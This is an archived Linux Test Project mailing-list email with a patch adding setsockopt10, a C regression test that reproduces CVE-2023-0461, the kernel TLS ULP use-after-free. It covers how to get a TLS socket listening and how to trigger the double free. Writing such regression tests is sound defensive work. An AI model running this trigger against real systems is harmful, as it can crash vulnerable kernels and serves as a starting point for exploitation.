Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id E0070CDB482
	for <ltp@archiver.kernel.org>; Mon, 16 Oct 2023 09:24:08 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 4CA463CD14A
	for <ltp@archiver.kernel.org>; Mon, 16 Oct 2023 11:24:07 +0200 (CEST)
Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it
 [IPv6:2001:4b78:1:20::2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (P-384))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id E235D3C86BA
 for <ltp@lists.linux.it>; Mon, 16 Oct 2023 11:23:55 +0200 (CEST)
Received: from smtp-out2.suse.de (smtp-out2.suse.de [IPv6:2001:67c:2178:6::1d])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-2.smtp.seeweb.it (Postfix) with ESMTPS id DD949600851
 for <ltp@lists.linux.it>; Mon, 16 Oct 2023 11:23:54 +0200 (CEST)
Received: from relay2.suse.de (relay2.suse.de [149.44.160.134])
 by smtp-out2.suse.de (Postfix) with ESMTP id 5A1C81F8C1;
 Mon, 16 Oct 2023 09:23:53 +0000 (UTC)
Received: from g78.cable.virginm.net (unknown [10.163.25.62])
 by relay2.suse.de (Postfix) with ESMTP id 00CB32CB3C;
 Mon, 16 Oct 2023 09:23:52 +0000 (UTC)
To: ltp@lists.linux.it
Date: Mon, 16 Oct 2023 10:23:46 +0100
Message-ID: <20231016092346.23805-1-rpalethorpe@suse.com>
X-Mailer: git-send-email 2.42.0
MIME-Version: 1.0
X-Spamd-Bar: +++++++++++++++++
Authentication-Results: smtp-out2.suse.de; dkim=none;
 dmarc=fail reason="No valid SPF, No valid DKIM" header.from=suse.com
 (policy=quarantine); 
 spf=fail (smtp-out2.suse.de: domain of rpalethorpe@suse.com does not designate
 149.44.160.134 as permitted sender) smtp.mailfrom=rpalethorpe@suse.com
X-Rspamd-Server: rspamd2
X-Spamd-Result: default: False [17.50 / 50.00]; ARC_NA(0.00)[];
 R_SPF_FAIL(1.00)[-all]; FROM_HAS_DN(0.00)[];
 TO_DN_SOME(0.00)[]; TO_MATCH_ENVRCPT_ALL(0.00)[];
 R_MISSING_CHARSET(2.50)[]; MIME_GOOD(-0.10)[text/plain];
 BROKEN_CONTENT_TYPE(1.50)[];
 RWL_MAILSPIKE_GOOD(0.00)[149.44.160.134:from];
 DMARC_POLICY_QUARANTINE(1.50)[suse.com : No valid SPF, No valid
 DKIM,quarantine]; VIOLATED_DIRECT_SPF(3.50)[];
 MX_GOOD(-0.01)[]; RCPT_COUNT_TWO(0.00)[2];
 MID_CONTAINS_FROM(1.00)[]; NEURAL_HAM_SHORT(-1.00)[-1.000];
 NEURAL_SPAM_LONG(3.00)[1.000]; RCVD_NO_TLS_LAST(0.10)[];
 FROM_EQ_ENVFROM(0.00)[]; R_DKIM_NA(0.20)[];
 MIME_TRACE(0.00)[0:+]; RCVD_COUNT_TWO(0.00)[2];
 BAYES_HAM(-3.00)[100.00%]
X-Rspamd-Queue-Id: 5A1C81F8C1
X-Virus-Scanned: clamav-milter 1.0.1 at in-2.smtp.seeweb.it
X-Virus-Status: Clean
Subject: [LTP] [PATCH v2] Add setsockopt10 TLS ULP UAF CVE-2023-0461
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
From: Richard Palethorpe via ltp <ltp@lists.linux.it>
Reply-To: Richard Palethorpe <rpalethorpe@suse.com>
Cc: Richard Palethorpe <rpalethorpe@suse.com>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

Signed-off-by: Richard Palethorpe <rpalethorpe@suse.com>
---

V2:
* rm taint check, it's done by lib
* flush before doing double free because I found it was cutting the message in two
* switch sleep to sched_yield
* also reap children before concluding we didn't trigger the bug

I haven't added needs_drivers. I'd prefer to add that later when
Petr's patchset is merged.

 configure.ac                                  |   1 +
 runtest/cve                                   |   1 +
 runtest/syscalls                              |   1 +
 .../kernel/syscalls/setsockopt/.gitignore     |   1 +
 .../kernel/syscalls/setsockopt/setsockopt10.c | 204 ++++++++++++++++++
 5 files changed, 208 insertions(+)
 create mode 100644 testcases/kernel/syscalls/setsockopt/setsockopt10.c

diff --git a/configure.ac b/configure.ac
index 30a6f56e6..e40a18fa0 100644
--- a/configure.ac
+++ b/configure.ac
@@ -64,6 +64,7 @@ AC_CHECK_HEADERS_ONCE([ \
     linux/netlink.h \
     linux/seccomp.h \
     linux/securebits.h \
+    linux/tls.h \
     linux/tty.h \
     linux/types.h \
     linux/userfaultfd.h \
diff --git a/runtest/cve b/runtest/cve
index f9b36a182..569558af2 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -85,6 +85,7 @@ cve-2022-0847 dirtypipe
 cve-2022-2590 dirtyc0w_shmem
 cve-2022-23222 bpf_prog07
 cve-2023-1829 tcindex01
+cve-2023-0461 setsockopt10
 # Tests below may cause kernel memory leak
 cve-2020-25704 perf_event_open03
 cve-2022-0185 fsconfig03
diff --git a/runtest/syscalls b/runtest/syscalls
index 53e519639..1851752cf 100644
--- a/runtest/syscalls
+++ b/runtest/syscalls
@@ -1425,6 +1425,7 @@ setsockopt06 setsockopt06
 setsockopt07 setsockopt07
 setsockopt08 setsockopt08
 setsockopt09 setsockopt09
+setsockopt10 setsockopt10
 
 settimeofday01 settimeofday01
 settimeofday02 settimeofday02
diff --git a/testcases/kernel/syscalls/setsockopt/.gitignore b/testcases/kernel/syscalls/setsockopt/.gitignore
index fd3235bb3..5c05290a5 100644
--- a/testcases/kernel/syscalls/setsockopt/.gitignore
+++ b/testcases/kernel/syscalls/setsockopt/.gitignore
@@ -7,3 +7,4 @@
 /setsockopt07
 /setsockopt08
 /setsockopt09
+/setsockopt10
diff --git a/testcases/kernel/syscalls/setsockopt/setsockopt10.c b/testcases/kernel/syscalls/setsockopt/setsockopt10.c
new file mode 100644
index 000000000..afd2c40a1
--- /dev/null
+++ b/testcases/kernel/syscalls/setsockopt/setsockopt10.c
@@ -0,0 +1,204 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+/*
+ * Copyright (C) 2023 SUSE LLC Richard Palethorpe <rpalethorpe@suse.com>
+ */
+/*\
+ * [Description]
+ *
+ * Reproducer for CVE-2023-0461 which is an exploitable use-after-free
+ * in a TLS socket. In fact it is exploitable in any User Level
+ * Protocol (ULP) which does not clone its context when accepting a
+ * connection.
+ *
+ * Because it does not clone the context, the child socket which is
+ * created on accept has a pointer to the listening socket's
+ * context. When the child is closed the parent's context is freed
+ * while it still has a reference to it.
+ *
+ * TLS can only be added to a socket which is connected. Not listening
+ * or disconnected, and a connected socket can not be set to
+ * listening. So we have to connect the socket, add TLS, then
+ * disconnect, then set it to listening.
+ *
+ * To my knowledge, setting a socket from open to disconnected
+ * requires a trick; we have to "connect" to an unspecified
+ * address. This could explain why the bug was not found earlier.
+ *
+ * The accepted fix was to disallow listening on sockets with a ULP
+ * set which does not have a clone function.
+ *
+ * The test uses two processes, first the child acts as a server so
+ * that the parent can create the TLS socket. Then the child connects
+ * to the parent's TLS socket.
+ *
+ * When we try to listen on the parent, the current kernel should
+ * return EINVAL. However if clone is implemented then this could
+ * become a valid operation. It is also quite easy to crash the kernel
+ * if we set some TLS options before doing a double free.
+ *
+ * commit 2c02d41d71f90a5168391b6a5f2954112ba2307c
+ * Author: Paolo Abeni <pabeni@redhat.com>
+ * Date:   Tue Jan 3 12:19:17 2023 +0100
+ *
+ *  net/ulp: prevent ULP without clone op from entering the LISTEN status
+ */
+
+#include "sched.h"
+#include "tst_test.h"
+
+#ifdef HAVE_LINUX_TLS_H
+
+#include <linux/tls.h>
+#include "netinet/in.h"
+#include "netinet/tcp.h"
+
+#include "lapi/sched.h"
+#include "tst_checkpoint.h"
+#include "tst_net.h"
+#include "tst_safe_net.h"
+#include "tst_taint.h"
+
+static struct tls12_crypto_info_aes_gcm_128 opts = {
+	.info = {
+		.version = TLS_1_2_VERSION,
+		.cipher_type = TLS_CIPHER_AES_GCM_128,
+	},
+	.iv = { 'i', 'v' },
+	.key = { 'k', 'e', 'y' },
+	.salt = { 's', 'a', 'l', 't' },
+	.rec_seq = { 'r', 'e', 'c', 's' },
+};
+
+static struct sockaddr_in tcp0_addr, tcp1_addr;
+static const struct sockaddr unspec_addr = {
+	.sa_family = AF_UNSPEC
+};
+
+static int tcp0_sk, tcp1_sk, tcp2_sk, tcp3_sk;
+
+static void setup(void)
+{
+	tst_init_sockaddr_inet(&tcp0_addr, "127.0.0.1", 0x7c90);
+	tst_init_sockaddr_inet(&tcp1_addr, "127.0.0.1", 0x7c91);
+}
+
+static void cleanup(void)
+{
+	if (tcp0_sk > 0)
+		SAFE_CLOSE(tcp0_sk);
+	if (tcp1_sk > 0)
+		SAFE_CLOSE(tcp1_sk);
+	if (tcp2_sk > 0)
+		SAFE_CLOSE(tcp2_sk);
+	if (tcp3_sk > 0)
+		SAFE_CLOSE(tcp3_sk);
+}
+
+static void child(void)
+{
+	tst_res(TINFO, "child: Listen for tcp1 connection");
+	tcp0_sk = SAFE_SOCKET(AF_INET, SOCK_STREAM, 0);
+	SAFE_BIND(tcp0_sk, (struct sockaddr *)&tcp0_addr, sizeof(tcp0_addr));
+	SAFE_LISTEN(tcp0_sk, 1);
+	TST_CHECKPOINT_WAKE(0);
+
+	tcp3_sk = SAFE_ACCEPT(tcp0_sk, NULL, 0);
+	TST_CHECKPOINT_WAIT(1);
+	SAFE_CLOSE(tcp3_sk);
+	SAFE_CLOSE(tcp0_sk);
+
+	tcp3_sk = SAFE_SOCKET(AF_INET, SOCK_STREAM, 0);
+	TST_CHECKPOINT_WAIT(2);
+
+	tst_res(TINFO, "child: connect for tcp2 connection");
+	TEST(connect(tcp3_sk, (struct sockaddr *)&tcp1_addr, sizeof(tcp1_addr)));
+
+	if (TST_RET == -1) {
+		tst_res(TINFO | TTERRNO, "child: could not connect to tcp1");
+		return;
+	}
+
+	TST_CHECKPOINT_WAIT(3);
+}
+
+static void run(void)
+{
+	const pid_t child_pid = SAFE_FORK();
+
+	if (child_pid == 0) {
+		child();
+		return;
+	}
+
+	tcp1_sk = SAFE_SOCKET(AF_INET, SOCK_STREAM, 0);
+	TST_CHECKPOINT_WAIT(0);
+
+	tst_res(TINFO, "parent: Connect for tcp0 connection");
+	SAFE_CONNECT(tcp1_sk, (struct sockaddr *)&tcp0_addr, sizeof(tcp0_addr));
+	TEST(setsockopt(tcp1_sk, SOL_TCP, TCP_ULP, "tls", 3));
+
+	if (TST_RET == -1 && TST_ERR == ENOENT)
+		tst_brk(TCONF | TTERRNO, "parent: setsockopt failed: The TLS module is probably not loaded");
+	else if (TST_RET == -1)
+		tst_brk(TBROK | TTERRNO, "parent: setsockopt failed");
+
+	SAFE_SETSOCKOPT(tcp1_sk, SOL_TLS, TLS_TX, &opts, sizeof(opts));
+	TST_CHECKPOINT_WAKE(1);
+
+	tst_res(TINFO, "parent: Disconnect by setting unspec address");
+	SAFE_CONNECT(tcp1_sk, &unspec_addr, sizeof(unspec_addr));
+	SAFE_BIND(tcp1_sk, (struct sockaddr *)&tcp1_addr, sizeof(tcp1_addr));
+
+	TEST(listen(tcp1_sk, 1));
+
+	if (TST_RET == -1) {
+		if (TST_ERR == EINVAL)
+			tst_res(TPASS | TTERRNO, "parent: Can't listen on disconnected TLS socket");
+		else
+			tst_res(TCONF | TTERRNO, "parent: Can't listen on disconnected TLS socket, but the errno is not EINVAL as expected");
+
+		TST_CHECKPOINT_WAKE(2);
+		tst_reap_children();
+		return;
+	}
+
+	tst_res(TINFO, "parent: Can listen on disconnected TLS socket");
+	TST_CHECKPOINT_WAKE(2);
+
+	tcp2_sk = SAFE_ACCEPT(tcp1_sk, NULL, 0);
+	SAFE_CLOSE(tcp2_sk);
+
+	tst_res(TINFO, "parent: Attempting double free, because we set cipher options this should result in an crash");
+	tst_flush();
+	SAFE_CLOSE(tcp1_sk);
+
+	TST_CHECKPOINT_WAKE(3);
+	tst_reap_children();
+	sched_yield();
+
+	tst_res(TCONF, "parent: We're still here, maybe the kernel can clone the TLS-ULP context now?");
+}
+
+static struct tst_test test = {
+	.setup = setup,
+	.cleanup = cleanup,
+	.test_all = run,
+	.forks_child = 1,
+	.needs_checkpoints = 1,
+	.taint_check = TST_TAINT_W | TST_TAINT_D,
+	.needs_kconfigs = (const char *[]) {
+		"CONFIG_TLS",
+		NULL
+	},
+	.tags = (const struct tst_tag[]) {
+		{"linux-git", "2c02d41d71f90"},
+		{"CVE", "2023-0461"},
+		{}
+	}
+};
+
+#else
+
+TST_TEST_TCONF("linux/tls.h missing, we assume your system is too old");
+
+#endif
-- 
2.40.1


-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
